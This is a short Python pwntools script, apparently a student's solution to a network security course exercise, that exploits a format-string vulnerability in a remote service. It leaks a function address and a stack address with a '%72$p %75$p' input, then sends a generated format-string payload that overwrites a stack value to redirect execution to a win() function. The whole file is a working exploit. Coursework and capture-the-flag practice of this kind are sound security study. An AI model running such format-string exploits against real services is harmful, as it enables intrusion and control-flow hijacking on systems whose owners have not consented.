# Network Security Ex1 - Script to call the win()-function
# Noah Link, Jan Pfeifer, Julian Weske

#!/usr/bin/python3
from pwn import *

context.clear(endian="little")
context.clear(arch="amd64")

# Establish connection
connection = remote("195.37.209.19", 9001)

# Send payload to retrieve addresses
connection.sendline(b"%72$p %75$p")
connection.sendline(b"scrt")

# Receive and process response
response = connection.recvline().strip()[19:].split()
win_address = int(response[0][2:], 16)
stack_address = int(response[1][2:], 16)
target_address = stack_address + 40

# This is where the magic happens
context.bits = 64
connection.sendline(fmtstr_payload(8, {target_address: win_address}, 0))

# Print proof :)
print(connection.recvall())
